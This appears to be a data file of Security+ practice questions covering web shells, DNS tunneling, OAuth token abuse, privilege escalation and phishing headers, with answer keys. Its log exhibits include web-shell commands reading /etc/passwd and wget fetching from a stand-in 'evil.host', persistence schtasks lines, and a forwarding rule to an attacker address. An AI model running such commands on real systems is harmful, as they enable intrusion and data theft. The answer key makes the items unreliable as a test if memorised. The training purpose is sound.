        label: "Severity",
        hint: "Data may be leaving over an unmonitored channel.",
        options: ["Informational", "High", "Low", "Medium"],
        answer: 1,
        explain: "High. DNS tunneling can exfiltrate data or run C2 over an often-unfiltered protocol, indicating likely active compromise of WKS-ENG-08."
      },
      {
        label: "First containment action",
        hint: "Cut the tunnel and the host.",
        options: ["Increase the DNS TTL", "Sinkhole/block bad.tld and isolate WKS-ENG-08", "Allow all TXT queries", "Disable internal DNS logging"],
        answer: 1,
        explain: "Block or sinkhole the tunneling domain at the resolver and isolate the source host to sever the covert channel while preserving the host for analysis."
      },
      {
        label: "Eradication / hardening action",
        hint: "Reduce future tunneling and find the malware.",
        options: ["Forward all DNS to public resolvers without inspection", "Force internal DNS resolution, inspect/limit DNS, and remediate the malware on the host", "Open port 53 outbound for all hosts", "Disable DNS entirely"],
        answer: 1,
        explain: "Require clients to use internal resolvers, deploy DNS inspection/threat feeds and rate limits, and remove the malware driving the tunnel from the affected host."
      }
    ],
    summary: "High-entropy TXT subdomain flood to a new domain = DNS tunneling. Sinkhole the domain, isolate the host, inspect/restrict DNS."
  },
  {
    id: "PBQ-058",
    format: 2,
    domain: 4,
    title: "Web Shell Upload via File Upload Bypass",
    brief: "A web server log shows an attacker uploading a script through an image upload endpoint, then executing commands. Triage the web-shell incident.",
    exhibitTitle: "Apache access/error log - app01",
    exhibit: "<span class='dim'>14:05:22</span> <span class='ok'>POST /upload.php name=avatar.png 200</span>\n<span class='dim'>14:06:01</span> <span class='hl'>POST /upload.php name=<span class='warnc'>shell.php.png</span> content-type=image/png 200 (saved to /uploads/)</span>\n<span class='dim'>14:06:40</span> <span class='hl'>GET <span class='warnc'>/uploads/shell.php?cmd=id</span> 200 ua=\"curl/8.1\"</span>\n<span class='dim'>14:06:41</span> <span class='hl'>response body contains: uid=33(www-data) gid=33(www-data)</span>\n<span class='dim'>14:07:30</span> <span class='hl'>GET /uploads/shell.php?cmd=<span class='warnc'>cat+/etc/passwd</span> 200</span>\n<span class='dim'>14:08:15</span> <span class='hl'>GET /uploads/shell.php?cmd=<span class='warnc'>wget+http://evil.host/m</span> 200</span>",
    fields: [
      {
        label: "Attack vector",
        hint: "A double-extension file that executes server-side commands.",
        options: ["Web shell uploaded via file-upload validation bypass", "TLS downgrade attack", "ARP poisoning", "Kerberoasting"],
        answer: 0,
        explain: "A double-extension upload (shell.php.png) saved to a web-accessible path and then executed via ?cmd= parameters is a web shell installed through a file-upload bypass, enabling remote command execution."
      },
      {
        label: "Severity",
        hint: "Arbitrary commands run as the web user.",
        options: ["Informational", "Low", "High", "Medium"],
        answer: 2,
        explain: "High. The attacker has confirmed remote code execution as www-data and is reading sensitive files and pulling more tooling, indicating active server compromise."
      },
      {
        label: "First containment action",
        hint: "Remove the shell and cut its callbacks.",
        options: ["Leave the shell to monitor the attacker", "Remove shell.php, isolate app01, and block evil.host egress", "Restart Apache only", "Grant www-data root to debug"],
        answer: 1,
        explain: "Delete the web shell, isolate the server, and block outbound to attacker infrastructure to cut RCE and second-stage downloads while preserving evidence."
      },
      {
        label: "Eradication / hardening action",
        hint: "Fix the upload flaw and verify integrity.",
        options: ["Validate upload type/extension, store uploads outside webroot with no execute, and reimage if integrity is uncertain", "Allow .php uploads to simplify", "Disable file logging", "Set the uploads directory to 777"],
        answer: 0,
        explain: "Enforce strict server-side file-type validation, store uploads outside the webroot without execute permission, patch the app, and reimage if compromise depth is unclear."
      }
    ],
    summary: "Double-extension upload + ?cmd= execution = web shell via upload bypass. Remove the shell, isolate, block egress, and fix upload validation."
  },
  {
    id: "PBQ-059",
    format: 2,
    domain: 4,
    title: "OAuth Token Theft and Mailbox Rule Abuse",
    brief: "Cloud audit logs show an attacker using a stolen OAuth refresh token to add a hidden inbox rule and forward mail. Respond to the token-based compromise.",
    exhibitTitle: "M365 Unified Audit Log - user tlee",
    exhibit: "<span class='dim'>08:20:00</span> <span class='ok'>UserLoggedIn tlee from 10.2.0.40 (corp) MFA satisfied</span>\n<span class='dim'>08:45:11</span> <span class='hl'>OAuth app <span class='warnc'>\"PDF Helper\"</span> granted scopes <span class='warnc'>Mail.ReadWrite, Mail.Send</span> (consent by tlee)</span>\n<span class='dim'>09:10:33</span> <span class='hl'>token used from <span class='warnc'>176.10.99.4 (RO)</span> - no new interactive MFA</span>\n<span class='dim'>09:11:02</span> <span class='hl'>New-InboxRule <span class='warnc'>\"r1\"</span>: move from:finance to RSS Feeds, mark read, <span class='warnc'>forward to ext@evil.host</span></span>\n<span class='dim'>09:12:40</span> <span class='hl'>Send on behalf of tlee to finance@partner.com (BEC attempt)</span>\n<span class='dim'>09:15:00</span> <span class='dim'>\"PDF Helper\" is an unverified third-party app</span>",
    fields: [
      {
        label: "Attack vector",
        hint: "A malicious OAuth grant used from abroad without re-MFA.",
        options: ["OAuth consent/token abuse enabling mailbox rule and BEC", "On-path TLS interception", "Password spraying the tenant", "DNS tunneling"],
        answer: 0,
        explain: "A malicious OAuth app granted mail scopes and its token reused from a foreign IP (bypassing interactive MFA) to add a hidden forwarding rule and send fraudulent mail is OAuth token abuse leading to business email compromise."
      },
      {
        label: "Severity",
        hint: "Mail is being forwarded externally and BEC is underway.",
        options: ["Informational", "High", "Low", "Medium"],
        answer: 1,
        explain: "High. External forwarding of finance mail and a BEC send indicate active account abuse with financial-fraud and data-loss risk."
      },
      {
        label: "First containment action",
        hint: "Tokens, not just passwords, must be revoked.",
        options: ["Reset the password only", "Revoke the OAuth app consent/tokens, revoke sessions, and remove the malicious inbox rule", "Block the partner domain", "Disable MFA for tlee"],
        answer: 1,
        explain: "Revoke the malicious app's consent and refresh tokens, kill active sessions, and delete the forwarding rule. A password reset alone does not invalidate an OAuth refresh token."
      },
      {
        label: "Eradication / hardening action",
        hint: "Stop risky third-party consent and detect rules.",
        options: ["Allow user consent to all apps", "Restrict third-party OAuth consent (admin approval), alert on new forwarding rules, and review for fraud", "Turn off audit logging", "Permit external auto-forwarding tenant-wide"],
        answer: 1,
        explain: "Require admin approval for third-party app consent, block/alert on external auto-forwarding and new inbox rules, and review any fraudulent transactions resulting from the BEC."
      }
    ],
    summary: "Malicious OAuth grant + foreign token reuse + forwarding rule = OAuth/BEC compromise. Revoke app tokens and sessions, remove the rule, restrict consent."
  },
  {
    id: "PBQ-060",
    format: 2,
    domain: 4,
    title: "Scheduled Task Persistence and Privilege Escalation",
    brief: "An EDR timeline shows a standard user escalating to SYSTEM via an unquoted service path and installing a scheduled task for persistence. Triage the host.",
    exhibitTitle: "EDR Timeline - WKS-OPS-15",
    exhibit: "<span class='dim'>20:01:10</span> <span class='ok'>user=bturner (standard) interactive logon</span>\n<span class='dim'>20:05:02</span> <span class='hl'>service <span class='warnc'>HelpdeskAgent</span> ImagePath=<span class='warnc'>C:\\Program Files\\Help Desk\\agent.exe</span> (unquoted)</span>\n<span class='dim'>20:05:03</span> <span class='hl'>dropped <span class='warnc'>C:\\Program.exe</span> by bturner; service restart loads it as SYSTEM</span>\n<span class='dim'>20:05:20</span> <span class='hl'>process token now <span class='warnc'>NT AUTHORITY\\SYSTEM</span> (escalated)</span>\n<span class='dim'>20:06:00</span> <span class='hl'>schtasks /create /sc onlogon /ru SYSTEM /tn <span class='warnc'>WinDefendSvc</span> /tr C:\\ProgramData\\u.exe</span>\n<span class='dim'>20:07:15</span> <span class='hl'>net localgroup administrators bturner /add</span>",
    fields: [
      {
        label: "Attack technique",
        hint: "An unquoted service path abused plus a logon task for persistence.",
        options: ["Local privilege escalation (unquoted service path) with scheduled-task persistence", "Cross-site scripting", "ARP spoofing", "Smurf amplification"],
        answer: 0,
        explain: "Planting C:\\Program.exe to hijack an unquoted service path executes as SYSTEM (privilege escalation), and the onlogon scheduled task plus admin-group add establish persistence."
      },
      {
        label: "Severity",
        hint: "A standard user obtained SYSTEM and persistence.",
        options: ["Informational", "High", "Low", "Medium"],
        answer: 1,
        explain: "High. Local escalation to SYSTEM with persistent autostart and admin-group membership gives the attacker durable, privileged control of the host."
      },
      {
        label: "First containment action",
        hint: "Cut the host off and stop the abused service/task.",
        options: ["Reboot to clear the task", "Isolate WKS-OPS-15, stop the HelpdeskAgent service, and disable the WinDefendSvc task", "Add bturner to Domain Admins to investigate", "Ignore until next patch cycle"],
        answer: 1,
        explain: "Isolate the host, stop the hijacked service, and disable the malicious scheduled task to halt SYSTEM execution and persistence while preserving evidence."
      },
      {
        label: "Eradication / hardening action",
        hint: "Remove persistence and fix the root flaw.",
        options: ["Quote service ImagePaths/fix permissions, remove C:\\Program.exe, the task, and the admin add; reimage if needed", "Leave the unquoted path as-is", "Grant all users SeDebugPrivilege", "Disable EDR to reduce alerts"],
        answer: 0,
        explain: "Remediate the unquoted service path and directory permissions, delete the planted binary, scheduled task, and unauthorized admin membership, and reimage if integrity is uncertain."
      }
    ],
    summary: "C:\\Program.exe hijacking an unquoted service path to SYSTEM + onlogon task = privesc with persistence. Isolate, stop the service/task, fix the path, remove persistence."
  }
);
SECPLUS.pbqs.push(
  {
    id: "PBQ-061",
    format: 3,
    domain: 2,
    title: "Vendor Invoice Wire-Fraud Email",
    brief: "An accounts-payable clerk forwarded an invoice email asking to update banking details for an existing vendor. Analyze the headers and body.",
    exhibitTitle: "message headers",
    exhibit: "<span class='dim'>Return-Path:</span> <billing@acme-payments.co>\nReceived: from mail.acme-payments.co (<span class='cy'>198.51.100.77</span>) by mx.yourco.com\nReceived: from unknown (<span class='hl'>185.220.101.5</span>) by mail.acme-payments.co\n<span class='dim'>Authentication-Results:</span> mx.yourco.com;\n  spf=<span class='hl'>fail</span> (sender IP is 185.220.101.5) smtp.mailfrom=acme-payments.co;\n  dkim=<span class='hl'>none</span>;\n  dmarc=<span class='hl'>fail</span> (p=reject)\n<span class='dim'>From:</span> \"Acme Corp Billing\" <billing@<span class='warnc'>acme-payments.co</span>>\n<span class='dim'>Reply-To:</span> <ar.update@<span class='hl'>acme-secure-billing.com</span>>\nMessage-ID: <8841a@acme-payments.co>\nSubject: URGENT: Updated remittance details for Invoice #44102\n\nPlease note our bank has changed. <span class='warnc'>Wire today</span> to the new account to avoid late fees.\nConfirm here: <a href='http://acme-secure-billing.com/pay'>www.acmecorp.com/invoice</a>",
    fields: [
      { label: "SPF / DKIM / DMARC result", hint: "Read the Authentication-Results block", options: ["All three pass", "SPF and DMARC both fail; DKIM absent", "Only DKIM fails", "Authentication was not evaluated"], answer: 1, explain: "spf=fail, dkim=none, and dmarc=fail (with p=reject) together indicate the message is unauthenticated and should be rejected or quarantined." },
      { label: "Is the sender spoofed?", hint: "Compare auth results and Reply-To", options: ["No, headers are clean", "Yes - auth failures plus a mismatched Reply-To domain", "No, Reply-To always differs", "Cannot tell from headers"], answer: 1, explain: "DMARC fail under p=reject plus a Reply-To pointing to a different domain than From is a strong spoofing/impersonation signal." },
      { label: "Most suspicious domain", hint: "Where would a reply or click actually go?", options: ["acme-payments.co", "acme-secure-billing.com", "yourco.com", "acmecorp.com"], answer: 1, explain: "acme-secure-billing.com is both the Reply-To target and the real href destination - a look-alike collecting redirected wire confirmations." },
      { label: "The link anchor is dangerous because", hint: "Compare visible text to href", options: ["It uses HTTPS", "Visible text shows acmecorp.com but href points to acme-secure-billing.com", "The link has no anchor text", "It points to your own domain"], answer: 1, explain: "The anchor text masquerades as the legitimate site while the href silently routes to the attacker domain - a classic deceptive link." },
      { label: "Best category for this attack", hint: "Targeted finance/vendor fraud", options: ["Generic phishing", "Business Email Compromise (BEC) / invoice fraud", "Vishing", "Pharming"], answer: 1, explain: "Impersonating a vendor to redirect a wire payment by changing banking details is the textbook BEC invoice-fraud pattern." }
    ],
    summary: "Vendor-impersonation BEC: SPF/DMARC fail, mismatched Reply-To and a masked link route a wire payment to a look-alike domain."
  },
  {
    id: "PBQ-062",
    format: 3,
    domain: 2,
    title: "PayPal Password-Reset Lure",
    brief: "A user received an email claiming their PayPal account is limited and forwarded it to the help desk. Inspect the headers.",
    exhibitTitle: "message headers",
    exhibit: "<span class='dim'>Return-Path:</span> <service@<span class='hl'>paypa1-security.com</span>>\nReceived: from web03.paypa1-security.com (<span class='cy'>203.0.113.40</span>) by mx.corp.com\n<span class='dim'>Authentication-Results:</span> mx.corp.com;\n  spf=<span class='ok'>pass</span> smtp.mailfrom=paypa1-security.com;\n  dkim=<span class='ok'>pass</span> header.d=paypa1-security.com;\n  dmarc=<span class='ok'>pass</span>\n<span class='dim'>From:</span> \"PayPal Service\" <service@<span class='hl'>paypa1-security.com</span>>\nMessage-ID: <a17c2@paypa1-security.com>\nSubject: Your account has been limited - verify within 24 hours\n\nWe detected unusual activity. <span class='warnc'>Verify now</span> or your account will be permanently suspended.\n<a href='http://paypa1-security.com/login'>https://www.paypal.com/account/verify</a>",
    fields: [
      { label: "What do the auth results show?", hint: "Read pass/fail and the domain they pass FOR", options: ["Everything fails", "SPF/DKIM/DMARC all pass - but only for paypa1-security.com", "DKIM fails", "DMARC is softfail"], answer: 1, explain: "Authentication passes, but only proves the message truly came from paypa1-security.com - not from the real paypal.com." },
      { label: "Is this sender spoofed?", hint: "Auth pass does not equal trustworthy", options: ["No - all auth passed so it is genuine PayPal", "Yes - the domain itself is a look-alike, not the real brand", "No - PayPal owns this domain", "Cannot determine"], answer: 1, explain: "Passing SPF/DKIM/DMARC only authenticates the sending domain. paypa1 (with a digit 1) is a typosquat, so the brand is being impersonated even though auth passes." },
      { label: "Identify the look-alike domain", hint: "Look for substituted characters", options: ["paypal.com", "paypa1-security.com", "corp.com", "mx.corp.com"], answer: 1, explain: "paypa1-security.com replaces the letter 'l' with the digit '1' - a homoglyph/typosquat of paypal.com." },
      { label: "Why is the link a tell?", hint: "Anchor text vs href host", options: ["It uses a shortener", "Anchor text reads paypal.com but href host is paypa1-security.com", "It is an internal link", "Href and anchor match exactly"], answer: 1, explain: "The displayed URL impersonates the real PayPal verify page while the actual href goes to the typosquatted domain." },
      { label: "Category of attack", hint: "Mass brand-credential harvesting", options: ["Spear phishing", "Generic (brand) phishing", "Whaling", "BEC"], answer: 1, explain: "An untargeted brand-impersonation credential-harvest using urgency is classic generic phishing." }
    ],
    summary: "Auth can pass and the email still be malicious: a typosquatted paypa1 domain harvests credentials behind a masked link. Auth proves the domain, not the brand."
  },
  {
    id: "PBQ-063",
    format: 3,
    domain: 2,
    title: "CEO Gift-Card Request",
    brief: "An executive assistant forwarded a short email that appears to come from the CEO asking for urgent help. Review it.",
    exhibitTitle: "message headers",
    exhibit: "<span class='dim'>Return-Path:</span> <ceo.dpierce@<span class='hl'>gmail.com</span>>\nReceived: from mail-sor-f41.google.com (<span class='cy'>209.85.220.41</span>) by mx.corp.com\n<span class='dim'>Authentication-Results:</span> mx.corp.com;\n  spf=<span class='ok'>pass</span> smtp.mailfrom=gmail.com;\n  dkim=<span class='ok'>pass</span> header.d=gmail.com;\n  dmarc=<span class='ok'>pass</span>\n<span class='dim'>From:</span> \"David Pierce (CEO)\" <ceo.dpierce@<span class='hl'>gmail.com</span>>\n<span class='dim'>Reply-To:</span> <ceo.dpierce@gmail.com>\nMessage-ID: <c91f@mail.gmail.com>\nSubject: Quick favor - are you at your desk?\n\nI am tied up in a meeting and need you to buy <span class='warnc'>5 x $200 Apple gift cards</span> for client gifts.\nSend the codes by photo ASAP. <span class='warnc'>Do not call me</span>, just handle it.",
    fields: [
      { label: "What does authentication tell you?", hint: "Whose domain passed?", options: ["The message failed all checks", "Auth passes for gmail.com - not the corporate domain", "DMARC failed", "DKIM is missing"], answer: 1, explain: "The email genuinely came from a gmail.com account; auth says nothing about whether that account belongs to the real CEO." },
      { label: "Is the CEO being impersonated?", hint: "Display name vs real address and channel", options: ["No, the CEO uses Gmail", "Yes - the CEO's name is on a random external Gmail, not the corporate address", "No, auth passed", "Cannot tell"], answer: 1, explain: "Display-name impersonation: the executive's name is attached to an unrelated free-mail account. The corporate CEO would send from the company domain." },
      { label: "Strongest social-engineering tell in the body", hint: "What discourages verification?", options: ["The greeting", "'Do not call me, just handle it' suppresses out-of-band verification", "The signature", "The subject font"], answer: 1, explain: "Instructing the target not to call removes the victim's chance to verify by a trusted channel - a hallmark of gift-card/BEC fraud." },
      { label: "Category of attack", hint: "Impersonating a senior executive to a specific employee", options: ["Generic phishing", "Whaling / CEO-fraud (a form of BEC)", "Pharming", "Smishing"], answer: 1, explain: "Impersonating the CEO to coerce a specific employee into buying gift cards is executive-impersonation BEC, often called whaling/CEO fraud." }
    ],
    summary: "Display-name spoofing on a free-mail account plus 'don't call me' urgency drives gift-card fraud. Verify out-of-band; auth on gmail.com proves nothing about the CEO."
  },
  {
    id: "PBQ-064",
    format: 3,
    domain: 2,
    title: "Microsoft 365 MFA-Fatigue Follow-Up",
    brief: "After a night of repeated MFA push prompts, a user got an email 'from IT' and forwarded it. Examine the headers.",
    exhibitTitle: "message headers",
    exhibit: "<span class='dim'>Return-Path:</span> <support@<span class='hl'>micros0ft-support.com</span>>\nReceived: from relay7.micros0ft-support.com (<span class='hl'>91.219.236.18</span>) by mx.corp.com\n<span class='dim'>Authentication-Results:</span> mx.corp.com;\n  spf=<span class='warnc'>softfail</span> smtp.mailfrom=micros0ft-support.com;\n  dkim=<span class='hl'>fail</span> header.d=micros0ft-support.com;\n  dmarc=<span class='hl'>fail</span>\n<span class='dim'>From:</span> \"Microsoft 365 Security\" <support@<span class='hl'>micros0ft-support.com</span>>\n<span class='dim'>Reply-To:</span> <helpdesk@<span class='hl'>m365-itdesk.com</span>>\nMessage-ID: <77b1@micros0ft-support.com>\nSubject: Approve the pending sign-in to stop the alerts\n\nWe see repeated login attempts on your account. To <span class='warnc'>stop the notifications</span>, click below and approve.\n<a href='http://m365-itdesk.com/approve'>https://login.microsoftonline.com/approve</a>",
    fields: [
      { label: "Interpret the authentication line", hint: "Note softfail vs fail", options: ["All pass", "SPF softfail, DKIM fail, DMARC fail - unauthenticated", "Only SPF passes", "Not evaluated"], answer: 1, explain: "softfail means SPF is suspicious-but-not-hard-fail; combined with dkim=fail and dmarc=fail, the message is effectively unauthenticated." },
      { label: "Is the sender spoofed?", hint: "Domain plus Reply-To", options: ["No", "Yes - look-alike From domain and a different Reply-To domain", "No, Microsoft owns it", "Unknown"], answer: 1, explain: "micros0ft-support.com is a typosquat (zero for 'o'), and Reply-To points to yet another attacker domain - clear impersonation." },
      { label: "Which is the malicious link host?", hint: "The href, not the visible text", options: ["login.microsoftonline.com", "m365-itdesk.com", "corp.com", "micros0ft-support.com (anchor only)"], answer: 1, explain: "Despite showing the real login.microsoftonline.com, the href resolves to m365-itdesk.com - the credential/approval-stealing host." },
      { label: "How does this email weaponize the situation?", hint: "Why now, after MFA spam?", options: ["It offers a coupon", "It exploits MFA-fatigue, urging the tired user to 'approve' and stop the prompts", "It asks for a survey", "It schedules a meeting"], answer: 1, explain: "This is the social-engineering follow-up to an MFA bombing campaign - convincing the worn-down user to approve access or hand over a code." },
      { label: "Category of attack", hint: "Follow-up after push spam", options: ["Pharming", "MFA-fatigue / push-bombing follow-up phishing", "Whaling", "Vishing"], answer: 1, explain: "Pairing repeated push prompts with a 'just approve to stop them' message is the MFA-fatigue (push-bombing) social-engineering follow-up." }
    ],
    summary: "After push-bombing, a typosquatted 'IT' email urges the exhausted user to approve. softfail/fail/fail auth plus a masked link to a third attacker domain confirm the spoof."
  },
  {
    id: "PBQ-065",
    format: 3,
    domain: 2,
    title: "Shipping Notice Malware Lure",
    brief: "A user expecting a package forwarded a 'delivery failed' email. Inspect the headers and link.",
    exhibitTitle: "message headers",
    exhibit: "<span class='dim'>Return-Path:</span> <noreply@<span class='hl'>fedex-tracking-alert.com</span>>\nReceived: from out2.fedex-tracking-alert.com (<span class='cy'>192.0.2.61</span>) by mx.corp.com\nReceived: from [<span class='hl'>45.133.1.90</span>] by out2.fedex-tracking-alert.com\n<span class='dim'>Authentication-Results:</span> mx.corp.com;\n  spf=<span class='hl'>fail</span> smtp.mailfrom=fedex-tracking-alert.com;\n  dkim=<span class='hl'>none</span>;\n  dmarc=<span class='hl'>fail</span>\n<span class='dim'>From:</span> \"FedEx Delivery\" <noreply@<span class='hl'>fedex-tracking-alert.com</span>>\nMessage-ID: <33ad@fedex-tracking-alert.com>\nSubject: Delivery attempt failed - reschedule required\n\nYour parcel could not be delivered. <span class='warnc'>Download the attached label</span> or reschedule:\n<a href='http://fedex-tracking-alert.com/label.zip'>https://www.fedex.com/track/2204XQ</a>",
    fields: [
      { label: "Authentication summary", hint: "Three verdicts", options: ["All pass", "SPF fail, DKIM none, DMARC fail", "Only DMARC fails", "softfail across the board"], answer: 1, explain: "spf=fail with no DKIM signature and dmarc=fail means nothing about this sender is verified." },
      { label: "Identify the impostor domain", hint: "Real carrier vs the From host", options: ["fedex.com", "fedex-tracking-alert.com", "corp.com", "out2 relay only"], answer: 1, explain: "fedex.com is the real carrier; fedex-tracking-alert.com is an unaffiliated look-alike registered to lure recipients." },
      { label: "Why is the link especially dangerous?", hint: "Look at the file the href points to", options: ["It is HTTPS", "Anchor shows fedex.com but href downloads label.zip from the impostor domain", "It points to corp.com", "It is a calendar invite"], answer: 1, explain: "The anchor mimics the real tracking URL while the href delivers a .zip (likely malware) from the attacker domain - a masked malicious download." },
      { label: "Category of attack", hint: "Mass parcel-themed bait", options: ["Whaling", "Generic phishing (malware delivery)", "BEC", "Vishing"], answer: 1, explain: "A broad, untargeted shipping-themed lure pushing a malicious download is generic phishing used for malware delivery." }
    ],
    summary: "Parcel-delivery bait with spf=fail/dkim=none/dmarc=fail and a masked .zip download from a look-alike carrier domain - generic malware phishing."
  },
  {
    id: "PBQ-066",
    format: 3,
    domain: 2,
    title: "HR Benefits Enrollment Spear Phish",
    brief: "An employee forwarded an HR email about open enrollment that referenced their manager by name. Review it.",
    exhibitTitle: "message headers",
    exhibit: "<span class='dim'>Return-Path:</span> <benefits@<span class='hl'>corp-hr-portal.com</span>>\nReceived: from mailer.corp-hr-portal.com (<span class='cy'>198.51.100.23</span>) by mx.corp.com\n<span class='dim'>Authentication-Results:</span> mx.corp.com;\n  spf=<span class='ok'>pass</span> smtp.mailfrom=corp-hr-portal.com;\n  dkim=<span class='ok'>pass</span> header.d=corp-hr-portal.com;\n  dmarc=<span class='hl'>fail</span> (From domain misaligned)\n<span class='dim'>From:</span> \"Corp HR Benefits\" <benefits@<span class='hl'>corp.com</span>>\n<span class='dim'>Reply-To:</span> <hr.enroll@<span class='hl'>corp-hr-portal.com</span>>\nMessage-ID: <5512@corp-hr-portal.com>\nSubject: Action required: confirm 2026 benefits before Friday\n\nHi Dana - your manager Mark approved early enrollment. <span class='warnc'>Log in to confirm</span> your elections:\n<a href='http://corp-hr-portal.com/sso'>https://benefits.corp.com/enroll</a>",
    fields: [
      { label: "Why does DMARC fail despite SPF/DKIM pass?", hint: "Think alignment", options: ["DMARC was not checked", "SPF/DKIM authenticate corp-hr-portal.com, but the From header says corp.com - identifier misalignment", "DKIM actually failed", "The IP is private"], answer: 1, explain: "DMARC requires the authenticated domain to align with the visible From domain. Here auth passes for corp-hr-portal.com while From claims corp.com, so DMARC fails on alignment." },
      { label: "Is the sender spoofed?", hint: "From vs envelope/Reply-To", options: ["No, HR uses an external portal", "Yes - From is forged to corp.com while the real domain is corp-hr-portal.com", "No, DMARC fail is normal", "Unknown"], answer: 1, explain: "The From header is spoofed to display the trusted corp.com brand while the actual sending and Reply-To domain is the attacker's portal look-alike." },
      { label: "What makes this targeted (spear) rather than generic?", hint: "Look at the body details", options: ["It uses HTML", "It names the recipient (Dana) and her manager (Mark) for credibility", "It has a subject line", "It is short"], answer: 1, explain: "Personalized details - the victim's first name and their actual manager - indicate reconnaissance and tailoring, the defining trait of spear phishing." },
      { label: "Category of attack", hint: "Tailored to one person", options: ["Generic phishing", "Spear phishing", "Whaling", "Pharming"], answer: 1, explain: "A credential lure customized with the target's name and manager is spear phishing." }
    ],
    summary: "From-spoofed to corp.com but DMARC fails on alignment (real domain corp-hr-portal.com). Personalization (recipient + manager names) marks it as spear phishing."
  },
  {
    id: "PBQ-067",
    format: 3,
    domain: 2,
    title: "Bank Account-Locked Alert",
    brief: "A user forwarded an urgent 'your account is locked' email purporting to be from their bank. Analyze it.",
    exhibitTitle: "message headers",
    exhibit: "<span class='dim'>Return-Path:</span> <alerts@<span class='hl'>secure-chasebank-login.com</span>>\nReceived: from mx9.secure-chasebank-login.com (<span class='hl'>23.94.55.210</span>) by mx.corp.com\n<span class='dim'>Authentication-Results:</span> mx.corp.com;\n  spf=<span class='warnc'>softfail</span> smtp.mailfrom=secure-chasebank-login.com;\n  dkim=<span class='hl'>fail</span>;\n  dmarc=<span class='hl'>fail</span>\n<span class='dim'>From:</span> \"Chase Online\" <alerts@<span class='hl'>secure-chasebank-login.com</span>>\n<span class='dim'>Reply-To:</span> <support@<span class='hl'>chase-verify.help</span>>\nMessage-ID: <61dd@secure-chasebank-login.com>\nSubject: We locked your account - verify identity immediately\n\nFor your protection we locked online access. <span class='warnc'>Restore access now</span> by re-entering your details:\n<a href='http://chase-verify.help/unlock'>https://www.chase.com/secure</a>",
    fields: [
      { label: "Authentication verdict", hint: "softfail and two fails", options: ["All pass", "SPF softfail, DKIM fail, DMARC fail", "Only DKIM passes", "Not present"], answer: 1, explain: "softfail plus dkim=fail plus dmarc=fail means the message is unauthenticated and inconsistent with the claimed brand." },
      { label: "Pick the look-alike domain", hint: "Real bank domain is short", options: ["chase.com", "secure-chasebank-login.com", "corp.com", "mx.corp.com"], answer: 1, explain: "chase.com is the legitimate bank; secure-chasebank-login.com piles trust words around the brand to look official." },
      { label: "The Reply-To is a red flag because", hint: "Compare it to From and to the bank", options: ["It matches the From exactly", "It points to a third, unrelated domain (chase-verify.help)", "It is empty", "It is the corporate domain"], answer: 1, explain: "Replies route to chase-verify.help - neither the From domain nor the real bank - a sign the attacker wants direct contact off-brand." },
      { label: "Category of attack", hint: "Mass bank-credential theft", options: ["Spear phishing", "Generic phishing", "BEC", "Whaling"], answer: 1, explain: "A broad bank-impersonation credential harvest using fear/urgency is generic phishing." }
    ],
    summary: "Bank-lock scare with softfail/fail/fail auth, a trust-word look-alike domain, an off-brand Reply-To and a masked link to chase.com - generic credential phishing."
  },
  {
    id: "PBQ-068",
    format: 3,
    domain: 2,
    title: "DocuSign Signature Request",
    brief: "A user forwarded a 'document waiting for signature' email. Inspect the headers and the link.",
    exhibitTitle: "message headers",
    exhibit: "<span class='dim'>Return-Path:</span> <dse@<span class='hl'>docusign-notify.net</span>>\nReceived: from edge3.docusign-notify.net (<span class='cy'>198.51.100.140</span>) by mx.corp.com\nReceived: from [<span class='hl'>194.5.249.12</span>] by edge3.docusign-notify.net\n<span class='dim'>Authentication-Results:</span> mx.corp.com;\n  spf=<span class='hl'>fail</span> smtp.mailfrom=docusign-notify.net;\n  dkim=<span class='ok'>pass</span> header.d=docusign-notify.net;\n  dmarc=<span class='warnc'>fail</span>\n<span class='dim'>From:</span> \"DocuSign\" <dse@<span class='hl'>docusign-notify.net</span>>\nMessage-ID: <90fe@docusign-notify.net>\nSubject: You have a document to review and sign\n\nA contract is awaiting your signature. <span class='warnc'>Review document</span> to continue:\n<a href='http://docusign-notify.net/view?id=8841'>https://account.docusign.com/review</a>",
    fields: [
      { label: "How do you read SPF fail but DKIM pass?", hint: "DMARC needs only one aligned pass", options: ["The email is fully trusted", "DKIM passed but DMARC still fails on alignment, so the message is not trustworthy", "DKIM pass overrides everything", "SPF is irrelevant"], answer: 1, explain: "Even with dkim=pass, dmarc=fail means the passing identifier is not aligned with the From domain or policy, so the message remains unverified." },
      { label: "Is this the real DocuSign?", hint: "Compare to docusign.com", options: ["Yes, docusign-notify.net is official", "No - docusign-notify.net is an unaffiliated look-alike of docusign.com", "Yes, auth passed", "Cannot tell"], answer: 1, explain: "Legitimate DocuSign mail aligns with docusign.com/docusign.net brand domains; docusign-notify.net is a registered look-alike." },
      { label: "Dangerous link indicator", hint: "Anchor host vs href host", options: ["Both point to docusign.com", "Anchor shows account.docusign.com but href is docusign-notify.net", "The link is plain text", "It points internally"], answer: 1, explain: "The visible URL impersonates the real DocuSign review page while the href routes to the look-alike notify domain." },
      { label: "Category of attack", hint: "Untargeted brand bait", options: ["Whaling", "Generic phishing", "Spear phishing", "Vishing"], answer: 1, explain: "A broadly distributed DocuSign-themed credential lure is generic phishing." }
    ],
    summary: "DKIM can pass yet DMARC fail on alignment. A look-alike docusign-notify.net hides a masked link to a fake review page - generic brand phishing."
  },
  {
    id: "PBQ-069",
    format: 3,
    domain: 2,
    title: "CFO Wire-Transfer Direct Request",
    brief: "A finance analyst forwarded an email appearing to be from the CFO requesting an immediate confidential wire. Review it.",
    exhibitTitle: "message headers",
    exhibit: "<span class='dim'>Return-Path:</span> <r.okafor@<span class='hl'>corp-cfo.com</span>>\nReceived: from mail.corp-cfo.com (<span class='hl'>104.244.72.115</span>) by mx.corp.com\n<span class='dim'>Authentication-Results:</span> mx.corp.com;\n  spf=<span class='ok'>pass</span> smtp.mailfrom=corp-cfo.com;\n  dkim=<span class='ok'>pass</span> header.d=corp-cfo.com;\n  dmarc=<span class='ok'>pass</span>\n<span class='dim'>From:</span> \"Rachel Okafor, CFO\" <r.okafor@<span class='hl'>corp-cfo.com</span>>\n<span class='dim'>Reply-To:</span> <r.okafor@corp-cfo.com>\nMessage-ID: <2c4d@corp-cfo.com>\nSubject: Confidential - acquisition wire needed today\n\nWe are closing an acquisition. Wire <span class='warnc'>$48,500 to the account I'll send</span> and keep this <span class='warnc'>strictly between us</span> until it closes. Time-sensitive.",
    fields: [
